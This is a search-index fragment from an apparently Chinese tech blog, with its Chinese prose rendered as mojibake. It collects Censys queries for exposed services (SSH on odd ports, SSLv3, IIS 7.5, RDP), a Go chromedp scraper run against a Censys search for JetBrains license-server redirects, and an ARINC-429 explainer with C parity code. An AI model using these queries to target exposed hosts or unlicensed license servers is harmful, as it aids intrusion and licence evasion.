","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:11","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"åœ¨ç«¯å£ 22 å’Œ 2222 ä»¥å¤–çš„ç«¯å£ä¸Šè¿è¡Œ SSH æœåŠ¡çš„ä¸»æœºï¼š same_service(services.service_name: \"SSH\" AND NOT (services.port: 22 OR services.port: 2222)) ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:12","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"åœ¨ç«¯å£ 443 ä¸Šè¿è¡Œ elasticsearch çš„ä¸»æœºï¼š same_service(services.service_name: \"ELASTICSEARCH\" AND services.port: 443) ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:13","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"æœ‰æœåŠ¡çš„ä¸»æœºï¼Œæœ€åä¸€æ¬¡è¢«NTT ISPå†…çš„Censysæ‰«æå™¨æ‰«æè¿‡çš„ã€‚ services.perspective_id: \"PERSPECTIVE_NTT\" ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:14","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"åœ¨NTTæˆ–TELIA ISPå†…ï¼Œå…·æœ‰Censysæ‰«æå™¨æœ€åæ‰«æçš„æœåŠ¡çš„ä¸»æœºã€‚ services.perspective_id: \"PERSPECTIVE_NTT\" OR services.perspective_id: \"PERSPECTIVE_TELIA\" åœ¨HTTPæœåŠ¡ä¸Šæœ‰ä¸€ä¸ªåŒ…å« â€œdashboard â€œä¸€è¯çš„é¡µé¢æ ‡é¢˜çš„ä¸»æœºã€‚ services.http.response.html_title: dashboard ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:15","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…·æœ‰å“åº”æœåŠ¡å™¨é”™è¯¯çŠ¶æ€ä»£ç çš„ HTTP æœåŠ¡çš„ä¸»æœºï¼š services.http.response.status_code: 500 ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:16","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…·æœ‰ç‰¹å®š HTTP æ ‡å¤´-å€¼å¯¹çš„ HTTP æœåŠ¡çš„ä¸»æœºï¼š services.http.response.headers.connection: close AND services.http.response.headers.content_type: text/plain ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:17","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…·æœ‰æä¾›è¯ä¹¦çš„ RDP æœåŠ¡çš„ä¸»æœºï¼š same_service(services.service_name: RDP AND services.certificate: *) ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:18","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…·æœ‰ä»»ä½•è¿è¡ŒSSLv3çš„æœåŠ¡çš„ä¸»æœºã€‚ services.tls.version_selected: SSLv3 ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:19","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…·æœ‰åœ¨ subject_dn ä¸­æä¾›å¸¦æœ‰å­—ç¬¦ä¸²â€œlocalhostâ€çš„ TLS è¯ä¹¦çš„æœåŠ¡çš„ä¸»æœºï¼š services.tls.certificates.leaf_data.subject_dn: \"localhost\" ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:20","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…·æœ‰è¿è¡Œå¾®è½¯IIS 7.5çš„æœåŠ¡çš„ä¸»æœºã€‚ services.software.product: IIS AND services.software.vendor: Microsoft AND services.software.version: 7.5 ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:21","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…·æœ‰å‘ˆç°æ“ä½œç³»ç»Ÿå’Œåº”ç”¨è½¯ä»¶ç‰¹å®šç»„åˆçš„æœåŠ¡çš„ä¸»æœº: same_service(services.software.uniform_resource_identifier: `cpe:2.3:o:canonical:ubuntu_linux:18.04:*:*:*:*:*:*:*` AND services.software.uniform_resource_identifier: `cpe:2.3:a:openbsd:openssh:7.6p1:*:*:*:*:*:*:*`) ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:22","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"è¿è¡Œ Raspberry Pi äº§å“çš„ä¸»æœº: services.software.product: \"Raspberry Pi\" ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:23","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"åŒ…å«å•è¯ University çš„ ASes ä¸­çš„ä¸»æœºï¼š autonomous_system.description: University ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:24","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å­—æ®µå®šä¹‰ https://search.censys.io/search/definitions?resource=hosts ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:3:0","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["golang"],"content":"golangä¸­ç”¨get()æˆ–httpClient è¿›è¡Œgetæ—¶å¾—åˆ°çš„é™æ€é¡µé¢, å¦‚æœé¡µé¢ä¸­çš„å†…å®¹æ˜¯è·å–åˆ°æœ¬åœ°ååŠ¨æ€ç”Ÿæˆçš„è¯, åº”è¯¥å¦‚ä½•å¾—åˆ°å‘¢ ","date":"2022-08-18","objectID":"/golang%E8%8E%B7%E5%BE%97%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/:0:0","tags":["http","crawler"],"title":"Golangè·å¾—åŠ¨æ€ç½‘é¡µå†…å®¹","uri":"/golang%E8%8E%B7%E5%BE%97%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/"},{"categories":["golang"],"content":"ä¸¾ä¾‹ æœ‰ä¸€äº›è¿æ¥ä½ é€šè¿‡http.getæ–¹æ³•åªèƒ½å¾—åˆ°ç½‘é¡µçš„ä¸€ä¸ªæ¡†æ¶, å…¶ä¸­å¹¶æ²¡æœ‰å®è´¨çš„æŸ¥è¯¢ç»“æœ, å’Œä½ é€šè¿‡æµè§ˆå™¨ç›´æ¥è®¿é—®å¾—åˆ°çš„htmlæ˜¯ä¸ä¸€æ ·çš„. ä½¿ç”¨chromedp: https://github.com/chromedp/chromedp é€šè¿‡chromedp.WaitVisible(selector),æ¥ç­‰å¾…åŠ¨æ€ç”Ÿæˆçš„å†…å®¹å‡ºç° å…¶ä¸­ selectorå­—ç¬¦ä¸²é€šè¿‡æµè§ˆå™¨çš„å¼€å‘è€…æ§åˆ¶å°, å³å‡»html, é€‰æ‹© copy selectoræ¥å¾—åˆ° // GetHttpHtmlContent è·å–ç½‘ç«™ä¸Šçˆ¬å–çš„æ•°æ® func GetHttpHtmlContent(url string, selector string, sel interface{}) (string, error) { options := []chromedp.ExecAllocatorOption{ chromedp.Flag(\"headless\", true), // debugä½¿ç”¨ chromedp.Flag(\"blink-settings\", \"imagesEnabled=false\"), chromedp.UserAgent(`Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36`), } //åˆå§‹åŒ–å‚æ•°ï¼Œå…ˆä¼ ä¸€ä¸ªç©ºçš„æ•°æ® options = append(chromedp.DefaultExecAllocatorOptions[:], options...) c, _ := chromedp.NewExecAllocator(context.Background(), options...) // create context chromeCtx, cancel := chromedp.NewContext(c, chromedp.WithLogf(log.Printf)) // æ‰§è¡Œä¸€ä¸ªç©ºtask, ç”¨æå‰åˆ›å»ºChromeå®ä¾‹ _ = chromedp.Run(chromeCtx, make([]chromedp.Action, 0, 1)...) //åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œè¶…æ—¶æ—¶é—´ä¸º40s æ­¤æ—¶é—´å¯åšæ›´æ”¹ è°ƒæ•´ç­‰å¾…é¡µé¢åŠ è½½æ—¶é—´ timeoutCtx, cancel := context.WithTimeout(chromeCtx, 40*time.Second) defer cancel() var htmlContent string err := chromedp.Run(timeoutCtx, chromedp.Navigate(url), chromedp.WaitVisible(selector), chromedp.OuterHTML(sel, \u0026htmlContent, chromedp.ByJSPath), ) if err != nil { //log.Fatal(\"Run err : %v\\n\", err) return \"\", err } //log.Println(htmlContent) return htmlContent, nil } func main() { selector := \"#resultset \u003e div:nth-child(2)\" param := `document.querySelector(\"body\")` url := \"https://search.censys.io/search?resource=hosts\u0026virtual_hosts=EXCLUDE\u0026q=%28services.http.response.headers.location%3A+account.jetbrains.com%2Ffls-auth%29+and+services.port%3D%6080%60\" html, _ := GetHttpHtmlContent(url, selector, param) log.Println(html) } ","date":"2022-08-18","objectID":"/golang%E8%8E%B7%E5%BE%97%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/:1:0","tags":["http","crawler"],"title":"Golangè·å¾—åŠ¨æ€ç½‘é¡µå†…å®¹","uri":"/golang%E8%8E%B7%E5%BE%97%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/"},{"categories":["golang"],"content":"æ›´è¯¦ç»†çš„ å‚è€ƒè¿™ä¸ªæ–‡ç« : https://segmentfault.com/a/1190000039349417 ","date":"2022-08-18","objectID":"/golang%E8%8E%B7%E5%BE%97%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/:2:0","tags":["http","crawler"],"title":"Golangè·å¾—åŠ¨æ€ç½‘é¡µå†…å®¹","uri":"/golang%E8%8E%B7%E5%BE%97%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9/"},{"categories":["aviation"],"content":"ARINC-429 å®šä¹‰äº†å•†ç”¨é£æœºèˆªç©ºç”µå­ç³»ç»Ÿä¹‹é—´(å±€åŸŸç½‘)æ•°å­—æ•°æ®ä¼ è¾“çš„æ ‡å‡†è¦æ±‚å’Œåè®®ã€‚è®¾å¤‡åˆ¶é€ å•†éµå¾ªè¿™äº›æ ‡å‡†ï¼Œä»è€Œå®ç°èˆªç©ºç”µå­è®¾å¤‡çš„äº’æ¢æ€§. ARINC 429 ä¹Ÿç§°ä¸º Mark 33 æ•°å­—ä¿¡æ¯ä¼ è¾“ç³»ç»Ÿ (DITS) æ€»çº¿ã€‚è™½ç„¶ä¸»è¦ç”¨äºèˆªç©ºç”µå­é¢†åŸŸï¼Œä½†è¿™äº›æ€»çº¿ä¹Ÿç”¨äºåœ°é¢è½¦è¾†ã€æ­¦å™¨ç³»ç»Ÿå’Œå…¶ä»–å•†ä¸šå’Œå†›äº‹è®¾å¤‡é¢†åŸŸã€‚ ","date":"2022-08-12","objectID":"/arinc429/:0:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"ARINC-429 æ–‡ä»¶ç»„ç»‡ç»“æ„ PART1 : æä¾›äº†ARINC 429åŠŸèƒ½çš„åŸºæœ¬æè¿°ä»¥åŠæ”¯æŒçš„ç‰©ç†å’Œç”µæ°”æ¥å£ã€‚è¿˜æä¾›äº†æ•°æ®å­—æ ¼å¼ã€æ ‡å‡†æ ‡ç­¾å’Œåœ°å€åˆ†é…ä»¥åŠç¤ºä¾‹ã€‚ PART2: å®šä¹‰äº†ARINC 429ç¦»æ•£é‡å­—å’ŒæŒ‰æ ‡ç­¾é¡ºåºçš„ä½åˆ†é…ã€‚ PART3: æè¿°äº†ARINC 429æ•°æ®ä¼ è¾“åè®®å’Œä»¥å¤§å—å’Œ/æˆ–æ–‡ä»¶æ ¼å¼ä¼ è¾“æ•°æ®çš„æ¶ˆæ¯å®šä¹‰ã€‚ PART4: æ˜¯å¤šå¹´æ¥å‘è¡¨çš„ARINC 429ç¬¬1éƒ¨åˆ†è¡¥ç¼–ï¼ˆ1è‡³17ï¼‰çš„æ¡£æ¡ˆã€‚å®ƒæ˜¯ä½œä¸ºARINC 429ç¬¬18å·è¡¥ç¼–æ›´æ–°çš„ä¸€éƒ¨åˆ†è€Œæ¨å‡ºçš„ï¼ˆ2012å¹´ï¼‰ã€‚ ","date":"2022-08-12","objectID":"/arinc429/:1:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"A429ç‰¹ç‚¹ ARINC 429 æ•°æ®ä¼ è¾“çš„ç‹¬ç‰¹ä¹‹å¤„åœ¨äºå…¶ç®€å•çš„å•å‘æ€»çº¿é€šä¿¡æ•°æ®æµã€‚è™½ç„¶å…¸å‹çš„æ•°æ®æ€»çº¿åœ¨ä¸€ç»„ç”µçº¿ä¸Šçš„å„ä¸ªæ€»çº¿ç‚¹ä¹‹é—´æä¾›å¤šå‘æ•°æ®ä¼ è¾“ã€‚ ARINC-429 å¹¶éå¦‚æ­¤, ä¼ è¯´æ˜¯ä¸ºäº†ç³»ç»Ÿå¯é æ€§ã€‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚RECEIVER_1â”‚ â”‚ ... â”‚ â”‚ RECEIVER_N â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â–² â–² â–² â”‚ SENDER â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Senderå¯ä»¥æ”¯æŒæœ€é«˜20ä¸ªReceiver è¦æƒ³åŒå‘ä¼ è¾“, å†æ·»åŠ ä¸€æ ¹çº¿ç¼†, Receiverå˜Sender Sendå’ŒReceiveé€šé“åœ¨ä¸åŒçš„ç«¯å£ä¸Š ä»¥ 32 ä½(bit)ä¸ºä¸€ä¸ªæ•°æ®å­—(WORD), æ¯ä¸ªå­—ä»£è¡¨ä¸€ä¸ªå·¥ç¨‹å•ä½ï¼Œä¾‹å¦‚é«˜åº¦æˆ–æ°”å‹ ä¼ è¾“é€šé“åˆ†ä¸ºé«˜é€Ÿå’Œä½é€Ÿä¸¤ç§, å‰è€…100kb/s , åè€… 12.5kb/s LRU æ²¡æœ‰ç”± ARINC 429 åˆ†é…çš„åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªè®¾å¤‡ ID å·ï¼Œå…è®¸è®¾å¤‡ç®¡ç†å’Œè®¾å¤‡çš„æ–‡ä»¶ä¼ è¾“è¢«åˆ†ç»„åˆ°ç³»ç»Ÿä¸­ã€‚ ä¸€ä¸ªè‡³å°‘4ä½çš„ç©ºæˆ–é›¶ç”µå‹å¯ä»¥åŒºåˆ†è¿ç»­çš„å­—ã€‚é€šè¿‡ä½¿ç”¨å­—ä¸å­—ä¹‹é—´çš„ç©ºé—´éš”ï¼Œå°±ä¸éœ€è¦å•ç‹¬çš„æ—¶é’Ÿä¿¡å·äº†ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸ªä¿¡å·è¢«ç§°ä¸ºè‡ªé”ä¿¡å·ã€‚ ","date":"2022-08-12","objectID":"/arinc429/:2:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"æ•°æ®å­—ç»“æ„ â”Œâ”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚P â”‚ SSM â”‚ DATA â”‚ SDI â”‚ LABLE â”‚ â””â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â”¬â”€â”€â” â”‚32â”‚31â”‚30â”‚29â”‚28â”‚27â”‚..â”‚14â”‚13â”‚12â”‚11â”‚10â”‚9 â”‚8 â”‚7 â”‚6 â”‚5 â”‚4 â”‚3 â”‚2 â”‚1 â”‚ â””â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”´â”€â”€â”˜ æ•°æ®ä»¥ 32 ä½å­—é€šè¿‡ ARINC-429 æ€»çº¿å‘é€ï¼Œæ¯ä¸ªå­—ä»£è¡¨ä¸€ä¸ªå·¥ç¨‹å•ä½ï¼Œä¾‹å¦‚é«˜åº¦æˆ–æ°”å‹ã€‚æ¶ˆæ¯çš„ä¸åŒéƒ¨åˆ†å¦‚ä¸Šå›¾æ‰€ç¤º. LABEL: 8 ä½æ ‡ç­¾ç”¨äºè§£é‡Šæ¶ˆæ¯çš„å…¶ä»–å­—æ®µâ€”â€”æ¯ç§ç±»å‹çš„è®¾å¤‡éƒ½æœ‰ä¸€ç»„ç”±æ ‡ç­¾ç¼–å·æ ‡è¯†çš„æ ‡å‡†å‚æ•°ï¼Œè€Œä¸åˆ¶é€ å•†æ— å…³ã€‚ä¾‹å¦‚ï¼Œä»»ä½•èˆªå‘å‚è€ƒç³»ç»Ÿçš„æ ‡ç­¾ 372 å°†æä¾›é£å‘ï¼Œä»»ä½•ç©ºæ°”æ•°æ®è®¡ç®—æœºçš„æ ‡ç­¾ 203 å°†æä¾›æ°”å‹é«˜åº¦, 312è¡¨ç¤ºåœ°é¢é€Ÿåº¦ SDI: 2ä½, æ˜¯æº/ç›®çš„åœ°æ ‡è¯†ç¬¦ (Source Destination Identifiers)ï¼Œç”±è¿æ¥åˆ°å¤šä¸ªæ¥æ”¶å™¨çš„å‘é€å™¨ä½¿ç”¨ï¼Œä»¥ç¡®å®šåº”ç”±å“ªä¸ªæ¥æ”¶å™¨å¤„ç†æ¶ˆæ¯ã€‚å¦‚æœä¸éœ€è¦ï¼Œè¿™äº›ä½å¯ä»¥ç”¨äºæ•°æ®ã€‚ DATA: 19ä½æ•°æ® SSM: Sign-Status Matrix ç¬¦å·çŠ¶æ€çŸ©é˜µ P: å¥‡å¶æ ¡éªŒä½ : ä½¿ç”¨å¥‡æ•°å¥‡å¶æ ¡éªŒä½œä¸ºé”™è¯¯æ£€æŸ¥ï¼Œä»¥ç¡®ä¿ç²¾ç¡®çš„æ•°æ®æ¥æ”¶ã€‚æ¯ä¸ªå­—ä¸­ä¼ è¾“çš„é€»è¾‘1çš„æ•°é‡æ˜¯ä¸€ä¸ªå¥‡æ•°ï¼Œé€šè¿‡è®¾ç½®æˆ–æ¸…é™¤ç¬¬32ä½æ¥è·å¾—å¥‡æ•°ã€‚ARINC 429æ²¡æœ‰è§„å®šçº é”™çš„æ–¹æ³•ï¼Œåªè§„å®šäº†é”™è¯¯æ£€æµ‹ã€‚ ","date":"2022-08-12","objectID":"/arinc429/:3:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"SSM ç¬¦å·çŠ¶æ€çŸ©é˜µ æ ¹æ®LABELçš„ä¸åŒ, SSMçš„æ„æ€å¯èƒ½ä¸åŒ, æ¯”å¦‚å¯ä»¥è¡¨ç¤ºé”™è¯¯çŠ¶æ€ 00 (0)ï¼šæ•…éšœï¼Œ 01 (1)ï¼šæ— è®¡ç®—æ•°æ®æˆ–è¾“å‡ºæ— æ•ˆï¼Œ 10 (2)ï¼šåŠŸèƒ½å®éªŒï¼Œ 11 (3)ï¼šæ­£å¸¸ #include \u003cstdio.h\u003e typedef unsigned int uint32_t; uint32_t getSSM(uint32_t x){ // è·å–bit30å’Œbit31çš„å€¼ uint32_t ssm = (x \u003e\u003e 29) \u0026 0x3; return ssm; } uint32_t setSSM(uint32_t x, uint32_t ssm){ if (ssm \u003e 3) { printf(\"ssm is out of range, should be 0 or 1 or 2 or 3\\n\"); return x; } // è®¾ç½®bit30å’Œbit31çš„å€¼ uint32_t mask = 0x3 \u003c\u003c 29; x = x \u0026 (~mask); x = x | (ssm \u003c\u003c 29); return x; } //æ‰“å°å‡ºæ¯ä¸€ä½ void print_bits(uint32_t x){ uint32_t i=0; for (i=0; i\u003c32; i++){ printf(\"%d\", (x \u0026 0x80000000) \u003e\u003e 31); x = x \u003c\u003c 1; } } int main(){ uint32_t x = 0x40012E92; print_bits(x); printf(\" ==\u003e %d\\n\", getSSM(x)); x = 0x60012E92; print_bits(x); printf(\" ==\u003e %d\\n\", getSSM(x)); x = 0x20012E92; print_bits(x); printf(\" ==\u003e %d\\n\", getSSM(x)); x = 0x12E92; print_bits(x); printf(\" ==\u003e %d\\n\", getSSM(x)); x = 0x1234; print_bits(setSSM(x, 0)); printf(\" \u003c== %d\\n\",0); print_bits(setSSM(x, 1)); printf(\" \u003c== %d\\n\",1); print_bits(setSSM(x, 2)); printf(\" \u003c== %d\\n\",2); print_bits(setSSM(x, 3)); printf(\" \u003c== %d\\n\",3); return 0; } è¾“å‡º 01000000000000010010111010010010 ==\u003e 2 01100000000000010010111010010010 ==\u003e 3 00100000000000010010111010010010 ==\u003e 1 00000000000000010010111010010010 ==\u003e 0 00000000000000000001001000110100 \u003c== 0 00100000000000000001001000110100 \u003c== 1 01000000000000000001001000110100 \u003c== 2 01100000000000000001001000110100 \u003c== 3 ","date":"2022-08-12","objectID":"/arinc429/:4:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"å¥‡æ•°å¥‡å¶æ ¡éªŒ ","date":"2022-08-12","objectID":"/arinc429/:5:0","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"è®¾ç½®æ ¡éªŒä½ A429é‡‡ç”¨çš„æ˜¯å¥‡æ ¡éªŒ è®©æ•´ä¸ª32ä½ä¸­, 1çš„ä¸ªæ•°ä¸ºå¥‡æ•° åˆå§‹å€¼WORDçš„ç¬¬32ä½ä¸º0 if WORDä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•° tempWORD = WORD å°†tempWORDçš„ç¬¬32ä½è®¾ç½®ä¸º1, ä½¿å…¶æœ‰å¥‡æ•°ä¸ª1 return tempWORD typedef unsigned int uint32_t; // è·å–ä½1çš„ä¸ªæ•° int getBit1Count(uint32_t x){ uint32_t i=0, count = 0, temp = x; for (i=0; i\u003c32; i++){ if (1 == (temp \u0026 0x00000001) ){ count++; } temp = temp \u003e\u003e 1; } return count; } // è®¾ç½®æ ¡éªŒä½ uint32_t setCheckBit(uint32_t x){ //å¦‚æœä¸ºå¶æ•°ä¸ª1 if (getBit1Count(x) % 2 == 0){ x = x ^ 0x80000000; // 0x80000000 = 10000000 00000000 00000000 00000000 }else{ x = x ^ 0x00000000; } return x; } ","date":"2022-08-12","objectID":"/arinc429/:5:1","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"æ ¡éªŒå’Œè¿˜åŸ æ ¡éªŒå°±æ˜¯çœ‹ä½ä¸Šçš„å€¼ä¸º1çš„ä¸ªæ•°æ˜¯å¦ä¸ºå¥‡æ•° è¿˜åŸ, å°†ç¬¬32ä½åˆ é™¤å³å¯ //æ£€æŸ¥æ ¡éªŒä½å¹¶è¿˜åŸ uint32_t checkAndRestore(uint32_t x){ uint32_t bit1Count = getBit1Count(x); if (bit1Count % 2 == 0){ printf(\"é”™è¯¯! \"); return 0; }else{ //x = x ^ 0x80000000; printf(\"æ­£ç¡®! \"); } //åˆ æ‰æœ€åä¸€ä½æ ¡éªŒä½ x = x \u0026 0x7FFFFFFF; return x; } ","date":"2022-08-12","objectID":"/arinc429/:5:2","tags":["arinc429"],"title":"ARINC-429","uri":"/arinc429/"},{"categories":["aviation"],"content":"å®Œæ•´ä»£ç  #include \u003cstdio.h\u003e typedef unsigned int uint32_t; // è·å–ä½1çš„ä¸ªæ•° int getBit1Count(uint32_t x){ uint32_t i=0, count = 0, temp = x; for (i=0; i\u003c32; i++){ if (1 == (temp \u0026 0x00000001) ){ count++; } temp = temp \u003e\u003e 1; } return count; } // è®¾ç½®æ ¡éªŒä½ uint32_t setCheckBit(uint32_t x){ //å¦‚æœä¸ºå¶æ•°ä¸ª1 if (getBit1Count(x) % 2 == 0){ x = x ^ 0x80000000; // 0x80000000 = 10000000 00000000 00000000 00000000 }else{ x = x ^ 0x00000000; } return x; } //æ‰“å°å‡ºæ¯ä¸€ä½ void print_bits(uint32_t x){ uint32_t i=0; for (i=0; i\u003c32; i++){ printf(\"%d\", (x \u0026 0x80000000) \u003e\u003e 31); x = x \u003c\u003c 1; } } //æ£€æŸ¥æ ¡éªŒä½å¹¶è¿˜åŸ uint32_t checkAndRestore(uint32_t x){ uint32_t bit1Count = getBit1Count(x); if (bit1Count % 2 == 0){ printf(\"é”™è¯¯! \"); return 0; }else{ //x = x ^ 0x80000000; printf(\"æ­£ç¡®! \"); } //åˆ æ‰æœ€åä¸€ä½æ ¡éªŒä½ x = x \u0026 0x7FFFFFFF; return x; } int main(){ uint32_t data[] = {0, 100, 101, 1001, 0x23456}; uint32_t i=0, set; for (i=0; i\u003c5; i++){ printf(\"è®¾ç½®æ ¡éªŒä½ä¹‹å‰: \"); print_bits(data[i]); printf(\",%dä¸ª1, 0x%x\\n\", getBit1Count(data[i]), data[i]); set = setCheckBit(data[i]); printf(\"è®¾ç½®æ ¡éªŒä½ä¹‹å: \"); print_bits(set); printf(\",%dä¸ª1, 0x%x\\n\",getBit1Count(set), set); printf(\"æ ¡éªŒå’Œè¿˜åŸ:0x%x\\n\", checkAndRestore(set)); printf(\"-------\\n\"); } return 0; } è¾“å‡º è®¾ç½®æ ¡éªŒä½ä¹‹å‰: 00000000000000000000000000000000,0ä¸ª1, 0x0 è®¾ç½®æ ¡éªŒä½ä¹‹å: 10000000000000000000000000000000,1ä¸ª1, 0x80000000 æ­£ç¡®! æ ¡éªŒå’Œè¿˜åŸ:0x0 ------- è®¾ç½®æ ¡éªŒä½ä¹‹å‰: 00000000000000000000000001100100,3ä¸ª1, 0x64 è®¾ç½®æ ¡éªŒä½ä¹‹å: 00000000000000000000000001100100,3ä¸ª1, 0x64 æ­£ç¡®! æ ¡éªŒå’Œè¿˜åŸ:0x64 ------- è®¾ç½®æ ¡éªŒä½ä¹‹å‰: 00000000000000000000000001100101,4ä¸ª1, 0x65 è®¾ç½®æ ¡éªŒä½ä¹‹å: 10000000000000000000000001100101,5ä¸ª1, 0x80000065 æ­£ç¡®! æ ¡éªŒå’Œè¿˜åŸ:0x65 ------- è®¾ç½®æ ¡éªŒä½ä¹‹å‰: 00000000000000000000001111101001,7ä¸ª1, 0x3e9 è®¾ç½®æ ¡éªŒä½ä¹‹å: 00000000000000000000001111101001,7ä¸ª1, 0x3e9 æ­£ç¡®! æ ¡éªŒå’Œè¿˜åŸ:0x3e9 ------- è®¾ç½®æ ¡éªŒä½ä¹‹å‰: 00000000000000100011010001010110,8ä¸ª1, 0x23456 è®¾ç½®æ ¡éªŒä½ä¹‹å: 10000000000000100011010001010110,9ä¸ª1, 0x80023456 æ­£ç¡®! æ ¡éªŒå’Œè¿˜åŸ:0x23456 ------- 